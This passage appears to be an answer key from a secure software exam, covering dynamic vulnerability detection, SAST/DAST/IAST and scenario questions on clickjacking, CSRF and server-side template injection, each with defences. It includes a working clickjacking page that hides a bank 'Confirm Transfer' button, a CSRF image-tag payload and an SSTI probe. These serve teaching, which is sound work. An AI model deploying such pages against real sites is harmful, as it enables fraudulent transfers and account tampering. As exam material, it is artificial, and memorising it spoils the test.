• Leakage of personal, financial, or corporate data
•   Privacy violations
•   Identity theft
4. Data Loss (Availability & Physical Risks)
********** 10 **********
--- page 11 ---
Description:
Data becomes unavailable due to attacks or physical compromise.
Examples:
•   Exploiting application vulnerabilities leading to crashes
• Unauthorized physical access
• Device theft or loss
Vulnerabilities Exploited:
• Lack of backup mechanisms
• Weak authentication (no biometrics/PIN)
• Unsecured physical access
Impact:
• Permanent data loss
• Business disruption
• Unauthorized data exposure
a. Comment on Dynamic Detection techniques and relate to how and which   [10]
vulnerability it helps in detecting.
(Two Techniques 5 Marks+5 Marks)
Dynamic Detection: Execute a program and monitor the execution to detect
vulnerabilities.
• Monitoring: specific vulnerability checks.
• Generating relevant executions: systematically selecting appropriate
inputs for a program under test.
Dynamic detection refers to techniques where a program is executed in a
runtime environment, and its behavior is monitored to identify
vulnerabilities. Unlike static analysis, it observes actual execution paths,
making it effective for detecting runtime issues.
Key Techniques in Dynamic Detection
(a) Monitoring (Runtime Analysis)
• The program is executed, and its behavior is continuously observed.
Q5   •   Tools track:
CO-2; SO-1;   o Memory usage
BL-2; U3   o Input/output behavior
o System calls
o Control flow
Techniques used:
• Runtime instrumentation
•   Taint analysis (tracking untrusted inputs)
• Execution tracing
• Memory sanitizers
Vulnerabilities Detected:
•   Buffer Overflow
o Detects illegal memory access during execution.
•   Use-after-free / Memory leaks
o   Identifies improper memory handling.
•   Injection Attacks (SQL, Command Injection)
o Tracks how user input propagates and affects execution.
• Race Conditions
o Observes unexpected behavior in concurrent execution.
********** 11 **********
--- page 12 ---
•   Privilege Escalation
o Detects abnormal system calls or unauthorized access
patterns.
(b) Generating Relevant Executions (Input Generation)
• Focuses on systematically generating inputs to explore different
execution paths.
• Ensures deeper coverage of program behavior.
Techniques used:
• Fuzz Testing (random or guided inputs)
• Symbolic Execution
•   Concolic Testing (Concrete + Symbolic)
•   Test case generation
Vulnerabilities Detected:
• Input Validation Errors
o Invalid inputs reveal improper validation.
• Crash Vulnerabilities
o Unexpected inputs cause program crashes (e.g.,
segmentation faults).
•   Logic Errors
o Incorrect handling of edge cases.
•   Authentication/Authorization Flaws
o Crafted inputs bypass checks.
•   Parsing Vulnerabilities
o Malformed inputs exploit parser weaknesses.
b. An attacker wants to trick users into unknowingly clicking the “Confirm   [10]
Transfer” button on an OnlineBank website using clickjacking.
i) Explain the process of clickjacking in this banking scenario.
Clickjacking occurs when an attacker tricks a user into clicking a hidden
element on a legitimate website. In this scenario, the attacker embeds the
OnlineBank transfer confirmation page inside an invisible iframe on a
malicious webpage. A fake button such as “Claim Reward” or “Start Game”
is placed exactly over the hidden “Confirm Transfer” button. When the user
clicks the visible button, the click is actually performed on the hidden
banking button, causing the transfer to be confirmed without the user’s
Q5   knowledge.
CO-3; SO-1;
BL-4; U5   ii) Design the attacker’s malicious web page that hides the “Confirm
Transfer” button. Explain the significant code.
<html>
<head>
<style>
iframe {
position:absolute;
top:0;
left:0;
width:600px;
height:400px;
********** 12 **********
--- page 13 ---
opacity:0;
z-index:2;
}
.fakebtn {
position:absolute;
top:200px;
left:250px;
z-index:3;
}
</style>
</head>
<body>
<button class="fakebtn">Click here to win a reward!</button>
<iframe src="https://onlinebank.com/transfer"></iframe>
</body>
</html>
iii) Why does the browser allow the banking page to be embedded inside
another page?
Browsers allow websites to be embedded in iframes by default. If the
OnlineBank server does not implement frame protection headers such as X-
Frame-Options or Content-Security-Policy, the browser will permit the page
to be displayed inside another webpage. This lack of restriction enables
attackers to load the banking interface inside a malicious site.
iv) What financial risks and security implications could result from this
attack?
This attack may lead to:
• Unauthorized money transfers
•   Financial loss for users
• Compromise of sensitive banking actions
• Loss of trust in the banking system
•   Potential legal and regulatory issues for the bank
If attackers can repeatedly trick users, they may manipulate transactions or
perform fraudulent payments.
v) What defensive techniques should the OnlineBank server implement to
prevent such attacks?
1. X-Frame-Options Header
X-Frame-Options: DENY
Prevents the banking page from being embedded inside an iframe.
2. Content Security Policy (CSP)
Content-Security-Policy: frame-ancestors 'none';
Ensures that no external website can embed the banking page.
********** 13 **********
--- page 14 ---
3. Frame Busting JavaScript
if (top !== self) {
top.location = self.location;
}
Prevents the page from running inside an iframe.
4. Transaction Confirmation
Require additional verification such as:
• OTP authentication
•   transaction PIN
• confirmation page
5. Secure UI Design
Display clear transaction details and require explicit user confirmation
before completing transfers.
a. Compare between SAST, DAST and IAST application security tools and   [10]
solutions.
(3+3+4 marks each)
DAST is known as a “black-box” testing method that tests the code when it’s
running and doesn’t have access to the source code. It is concerned with
identifying runtime issues and weaknesses in software and applications.
DAST testing is performed later in the SDLC, when software and applications
are actually working. A hacker’s rather than a developer’s perspective. DAST
is dynamic, because tests as applications run, so it needs a working version
of the application for it to perform testing. · DAST works by implementing
automated scans that simulate malicious external attacks on an application
to identify outcomes that are not part of an expected result set. One
example of this is injecting malicious data to uncover common injection
flaws. DAST tests all HTTP and HTML access points and also emulates
random actions and user behaviors to find vulnerabilities.
Q6
CO-1; SO-1;   · IAST is an AST tool designed for modern web and mobile applications that
BL-1; U1   works from within an application to detect and report issues while the
application is running. It occurs from within the application server to
inspect the compiled source code. · IAST typically is implemented by
deploying agents and sensors in the application post build. The agent
observes the application’s operation and analyzes traffic flow to identify
security vulnerabilities. It does this by mapping external signatures or
patterns to source code, which allows it to identify more complex
vulnerabilities. · IAST test results are usually reported in real time via a web
browser, dashboard, or customized report without adding extra time to the
CI/CD (continuous integration/ continuous delivery) pipeline. IAST results
can also be combined with other issues tracking tools.
· SAST is known as a “white-box” testing method that tests source code and
related dependencies statically, early in the software development lifecycle
(SDLC), to identify flaws and vulnerabilities in the code that pose a security
threat. · SAST enables developers to detect security flaws or weaknesses in
********** 14 **********
--- page 15 ---
their custom source code. The objective is either to comply with a
requirement or regulation (for example, Payment Card Industry Data
Security Standard PCI/DSS) or to achieve better understanding of one’s
software risk. Understanding security flaws is the first step toward
remediating security flaws and thus reducing software risk. · SAST scans
organizations’ static in-house code at rest, without having to run it. SAST is
usually implemented at the coding and testing stages of development,
integrating into CI servers and, more recently, into IDEs. · SAST scans are
based on a set of predetermined rules that define the coding errors in the
source code that need to be addressed and assessed. SAST scans can be
designed to identify some of the most common security vulnerabilities out
there, such as SQL injection, input validation, stack buffer overflows, and
more.
b. A user is logged into an e-commerce website ShopEasy. The website allows   [10]
users to change their delivery address using the following request:
GET http://shopeasy.com/changeAddress?addr=NewAddress
HTTP/1.1
An attacker wants to change the victim’s delivery address to their own
location.
i) Identify the attack type and explain how the attacker exploits the
vulnerability.
The attack is a Cross-Site Request Forgery (CSRF) attack.
In a CSRF attack, the attacker tricks a logged-in user into sending a forged
request to a trusted website. Since the victim is already authenticated to
ShopEasy, the browser automatically sends the session cookie along with
the request. The attacker embeds a malicious request that changes the
delivery address to the attacker’s address. When the victim visits the
Q6   malicious page, the browser unknowingly sends the request, and the
CO-2; SO-1;   address is changed.
BL-1; U4
ii) What steps could the attacker take to deliver the malicious request to
the victim?
1. The attacker studies the address change request format:
http://shopeasy.com/changeAddress?addr=NewAddress
2. The attacker modifies the address parameter to their own address:
http://shopeasy.com/changeAddress?addr=AttackerAddress
3. The attacker embeds this request in a malicious webpage.
Example malicious page:
<img src="http://shopeasy.com/changeAddress?addr=AttackerAddress">
4. The victim visits the malicious page while logged into ShopEasy.
5. The browser automatically sends the request with the victim’s
session cookie, causing the delivery address to change.
iii) What conditions must be present for the attack to successfully execute?
The attack is successful if:
********** 15 **********
--- page 16 ---
• The victim is logged into ShopEasy.
• The website does not validate request origin.
• The application performs sensitive actions using GET requests.
• No CSRF protection tokens are implemented.
• The victim is tricked into visiting a malicious webpage.
iv) What security practices should users follow to avoid such attacks?
Users should:
• Avoid clicking suspicious links or unknown advertisements.
• Log out of shopping accounts after use.
• Avoid browsing untrusted websites while logged into important
accounts.
• Use updated browsers and security tools.
v) What server-side protections should ShopEasy implement to defend
against CSRF?
1. CSRF Tokens
Include a unique token in every sensitive request.
Example:
POST /changeAddress
addr=NewAddress&csrf_token=ABC123
The server verifies the token before processing the request.
2. Use POST instead of GET
Sensitive actions such as address changes should use POST requests.
3. SameSite Cookie Attribute
Set-Cookie: sessionid=abc123; SameSite=Strict
This prevents cookies from being sent with cross-site requests.
4. Origin / Referer Validation
The server verifies that the request originates from the ShopEasy domain.
5. User Confirmation
Require password re-entry or OTP verification before changing delivery
addresses.
Q7   a.   [10]
Describe the BSIMM Framework for assessing the Secure Software Lifecycle.
CO-2; SO-1;
(Draw 5 marks + Explain 5 marks)
BL-1; U2
********** 16 **********
--- page 17 ---
b. An e-commerce website ShopReview.com allows users to submit product   [10]
reviews. The review text is dynamically rendered on the webpage using a
template engine.
Example template rendering code:
Hello {{ username }}, thank you for reviewing this product!
The application directly inserts user input into the template before
rendering the page.
i) Identify the type of attack that an attacker can exploit by injecting
malicious template expressions. Explain the attack.
The attack is Server-Side Template Injection (SSTI).
SSTI occurs when user input is directly embedded into a server-side
Q7
template without proper sanitization. Template engines process
CO-3; SO-4;
expressions such as {{ }} or ${ }. If an attacker injects malicious template
BL-4; U4
expressions, the template engine may execute them on the server,
allowing attackers to access sensitive data or execute commands.
ii) Write a malicious input payload that could be injected into the template
to test whether the server processes template expressions.
An attacker may inject a simple template expression:
{{7*7}}
If the template engine evaluates expressions, the output displayed on
the page will be:
********** 17 **********
--- page 18 ---
49
This confirms that the server is processing template expressions.
iii) What information or capabilities could the attacker gain if the attack is
successful?
If the attack succeeds, the attacker may gain:
• Access to server configuration data
• Access to environment variables
•   Ability to read sensitive files
•   Ability to execute system commands
• Access to database credentials or API keys
•   Full remote code execution on the server
iv) What conditions must exist in the application for this attack to be
successful?
The attack is successful if:
• User input is directly inserted into server-side templates
• The template engine evaluates expressions dynamically
• Input validation or sanitization is not implemented
• The template engine allows access to internal objects or functions
v) What secure coding practices and defensive mechanisms should
developers implement to prevent this vulnerability?
1. Avoid rendering user input directly in templates
Instead of:
Hello {{ username }}
Use safe template rendering methods.
2. Input validation and sanitization
Remove or escape template syntax such as:
{{ }}
${ }
<% %>
3. Use secure template engines
Some template engines support sandbox mode to prevent execution of
dangerous expressions.
4. Limit template capabilities
Disable access to:
• system commands
•   file system
•   internal server objects
5. Security testing
Perform code review and penetration testing to detect SSTI vulnerabilities.
********** 18 **********
--- page 19 ---
FRR ICR 7 QI OR
````
